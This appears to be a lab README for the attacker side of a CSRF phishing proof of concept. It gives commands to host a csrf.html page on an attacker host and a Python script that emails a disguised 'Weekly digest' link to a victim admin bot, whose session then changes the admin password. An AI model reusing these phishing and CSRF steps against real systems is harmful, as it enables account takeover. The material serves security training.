# Attacker side — CSRF phishing PoC

Reference exploit for the lab. Runs from any host **other than** the victim
(a different IP → genuinely cross-site). The repo's `deploy/kali-postfix/` holds
the Kali smarthost Postfix config, but any mail path to the victim works.

## 1. Point the PoC at the victim
Edit `csrf.html` and replace `VICTIM_IP` with the victim's current IP.

## 2. Host it
```bash
cd deploy/attacker
python3 -m http.server 8000        # serves http://<ATTACKER_IP>:8000/csrf.html
```

## 3. Email the admin bot a link to it
Via Postfix (smarthost → victim), or directly over SMTP:
```bash
python3 - <<'PY'
import smtplib
from email.message import EmailMessage
m = EmailMessage()
m["From"]="it-team@attacker.local"; m["To"]="john@newtbug.com"; m["Subject"]="Weekly digest"
m.set_content("http://<ATTACKER_IP>:8000/csrf.html")
smtplib.SMTP("<VICTIM_IP>", 25, timeout=15).send_message(m)
PY
```

The admin bot (Selenium) watches the victim's Maildir, visits links, and its
session rides the cross-site POST. Success = the admin password changes and the
scoreboard (`/var/www/html/assets/users.json`) flips `John` `true`→`false`.

## Note on reliability
The bot's headless Chrome must complete the cross-site navigation within its
`LINK_VISIT_TIMEOUT`. On a resource-starved victim VM that step can stall and the
POST never fires — give the victim enough CPU/RAM (don't run it alongside other
heavy VMs). This was the cause of an earlier "POST never arrives" symptom.
